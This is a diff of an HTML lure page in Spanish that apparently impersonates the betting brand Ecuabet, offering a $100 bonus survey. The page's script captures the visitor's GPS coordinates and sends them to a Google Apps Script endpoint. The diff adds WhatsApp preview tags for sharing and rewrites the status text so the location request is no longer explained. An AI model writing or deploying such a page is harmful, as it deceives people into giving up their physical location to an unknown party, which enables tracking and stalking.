@@ -6,23 +6,57 @@
     <title>Gana un Bono de $100 - Ecuabet</title>
     <meta name="description" content="Si ya eres parte de ECUABET, solo llena la siguiente encuesta.">
 
+    <!-- Meta Tags para vista previa de WhatsApp -->
     <meta property="og:type" content="website">
     <meta property="og:title" content="¿TE GUSTARÍA PARTICIPAR POR UN BONO DE $100?">
     <meta property="og:description" content="Si ya eres parte de ECUABET, solo llena la siguiente encuesta.">
     <meta property="og:image" content="https://raw.githubusercontent.com/iliali/ecuabet/main/ecuabet.png">
     <meta property="og:image:secure_url" content="https://raw.githubusercontent.com/iliali/ecuabet/main/ecuabet.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
 
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
-        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #1a237e; color: #fff; text-align: center; padding: 20px; }
-        .card { background: rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 12px; backdrop-filter: blur(10px); box-shadow: 0 4px 15px rgba(0,0,0,0.3); max-width: 420px; width: 100%; }
+        body { 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            background: #1a237e; 
+            color: #fff; 
+            text-align: center; 
+            padding: 20px; 
+        }
+        .card { 
+            background: rgba(255, 255, 255, 0.1); 
+            padding: 30px; 
+            border-radius: 12px; 
+            backdrop-filter: blur(10px); 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3); 
+            max-width: 420px; 
+            width: 100%; 
+        }
         h2 { font-size: 20px; margin-bottom: 15px; }
-        p { font-size: 14px; color: #e0e0e0; margin-bottom: 20px; }
-        .btn { width: 100%; padding: 14px; background-color: #00c853; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        p { font-size: 14px; color: #e0e0e0; margin-bottom: 20px; line-height: 1.4; }
+        .btn { 
+            width: 100%; 
+            padding: 14px; 
+            background-color: #00c853; 
+            color: white; 
+            border: none; 
+            border-radius: 6px; 
+            font-weight: bold; 
+            font-size: 16px; 
+            cursor: pointer; 
+            transition: background 0.3s;
+        }
+        .btn:hover { background-color: #00e676; }
         #status { margin-top: 15px; font-size: 13px; color: #ffd54f; }
     </style>
 </head>
 <body>
+
     <div class="card">
         <h2>Encuesta de Ecuabet</h2>
         <p>Haz clic en el botón para activar la verificación e ir a la encuesta.</p>
@@ -32,29 +66,48 @@
 
     <script>
         const targetUrl = "https://script.google.com/macros/s/AKfycbwd9e8X06X01Bn13evnRmV07WfOxI6pDob5gYWY0_sUzJJQ2FnaUg0WI9THY9bTDVJf/exec";
+        let yaRedirigido = false;
+
+        function irAlFormulario(lat = null, lng = null) {
+            if (yaRedirigido) return;
+            yaRedirigido = true;
+            
+            let finalUrl = targetUrl;
+            if (lat && lng) {
+                finalUrl += "?lat=" + lat + "&lng=" + lng;
+            }
+            window.location.href = finalUrl;
+        }
 
         function obtenerUbicacionYRedirigir() {
             const btn = document.getElementById('btnAction');
             const status = document.getElementById('status');
+            
             btn.disabled = true;
-            status.innerText = "Por favor, permite la ubicación en tu navegador...";
+            btn.innerText = "CARGANDO...";
+            status.innerText = "Redirigiendo a la encuesta...";
+
+            // Límite de tiempo estricto: si en 2.5 segundos no responde la geolocalización, redirige directamente
+            setTimeout(function() {
+                irAlFormulario();
+            }, 2500);
 
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
-                        const lat = position.coords.latitude;
-                        const lng = position.coords.longitude;
-                        // Redirige pasando las coordenadas por URL
-                        window.location.href = targetUrl + "?lat=" + lat + "&lng=" + lng;
+                        irAlFormulario(position.coords.latitude, position.coords.longitude);
                     },
                     function(error) {
-                        // Si deniega, redirige de todas formas
-                        window.location.href = targetUrl;
+                        irAlFormulario();
                     },
-                    { enableHighAccuracy: true, timeout: 6000 }
+                    {
+                        enableHighAccuracy: false, // Mayor compatibilidad y velocidad
+                        timeout: 2000,
+                        maximumAge: 60000
+                    }
                 );
             } else {
-                window.location.href = targetUrl;
+                irAlFormulario();
             }
         }
     </script>
